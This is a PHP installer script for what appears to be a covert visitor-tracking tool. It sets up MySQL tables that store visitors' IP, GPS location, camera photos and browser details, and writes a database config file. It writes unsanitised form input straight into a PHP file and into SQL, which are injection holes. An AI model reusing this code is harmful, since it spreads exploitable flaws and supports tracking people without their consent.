<?php
header('Access-Control-Allow-Origin:*');
header('Content-Type:application/json');
error_reporting(0);
//判断是否已经安装过
include_once("dbconfig.php");
if($db_host != NULL || $db_host != ""){
    $json = array(
        "code" => 203, 
        "msg" => '禁止重复安装'
    );
    echo json_encode($json, JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}
//尝试写入dbconfig.php
$myfile = fopen("dbconfig.php", "w") or unable();
fclose($myfile);
function unable(){
    $json = array(
        "code" => 202, 
        "msg" => '禁止写入'
    );
    echo json_encode($json, JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}
$db_host = $_POST['host'];
$db_port = $_POST['port'];
$db_name = $_POST['name'];
$db_user = $_POST['user'];
$db_password = $_POST['password'];
$conn = new mysqli($db_host.":".$db_port, $db_user, $db_password, $db_name);
// Check connection
if ($conn->connect_error) {
    $json = array(
        "code" => 201, 
        "msg" => '链接到MySQL服务器失败,'.$conn->connect_error
    );
    echo json_encode($json, JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit();
}
$sql = "CREATE TABLE `$db_name`.`tanzhen_web` ( `id` INT NOT NULL AUTO_INCREMENT , `keyvalue` TEXT NOT NULL , `gps_function` INT NOT NULL , `ip_function` INT NOT NULL , `camera_function` INT NOT NULL , `browser_function` INT NOT NULL , `url` TEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = MyISAM;";
if ($conn->query($sql) === TRUE) {
    $sql = "CREATE TABLE `$db_name`.`tanzhen_information` ( `id` INT NOT NULL AUTO_INCREMENT , `keyvalue` TEXT NULL DEFAULT NULL , `timestamp` TEXT NULL DEFAULT NULL , `ip` TEXT NULL DEFAULT NULL , `ipjing` TEXT NULL DEFAULT NULL , `ipwei` TEXT NULL DEFAULT NULL , `gpsaddress` TEXT NULL DEFAULT NULL , `gpsjing` TEXT NULL DEFAULT NULL , `gpswei` TEXT NULL DEFAULT NULL , `cameraphoto` TEXT NULL DEFAULT NULL , `language` TEXT NULL DEFAULT NULL , `type` TEXT NULL DEFAULT NULL , `UA` TEXT NULL DEFAULT NULL , `system` TEXT NULL DEFAULT NULL , `ipaddress` TEXT NULL DEFAULT NULL , PRIMARY KEY (`id`)) ENGINE = MyISAM;";
    if ($conn->query($sql) === TRUE) {
        $json = array(
            "code" => 200,
            "msg" => '创建成功'
        );
        //dbconfig.php
        $myfile = fopen("dbconfig.php", "w") or unable();
        $txt = '<?php';
        $yin = '"';
        fwrite($myfile, $txt);
        $txt = "\n";
        fwrite($myfile, $txt);
        $txt = '$db_host="';
        fwrite($myfile, $txt);
        $txt = "$db_host$yin;\n";
        fwrite($myfile, $txt);
        $txt = '$db_port = "';
        fwrite($myfile, $txt);
        $txt = "$db_port$yin;\n";
        fwrite($myfile, $txt);
        $txt = '$db_name = "';
        fwrite($myfile, $txt);
        $txt = "$db_name$yin;\n";
        fwrite($myfile, $txt);
        $txt = '$db_user = "';
        fwrite($myfile, $txt);
        $txt = "$db_user$yin;\n";
        fwrite($myfile, $txt);
        $txt = '$db_password = "';
        fwrite($myfile, $txt);
        $txt = "$db_password$yin;\n";
        fwrite($myfile, $txt);
        $txt = '?>';
        fwrite($myfile, $txt);
        fclose($myfile);
    } else {
        $json = array(
            "code" => 202,
            "msg" => '插入失败,'.$conn->error
        );
    }
} else {
    $json = array(
        "code" => 202,
        "msg" => '执行失败,'.$conn->error
    );
}
echo json_encode($json, JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
$conn->close();
exit();
?>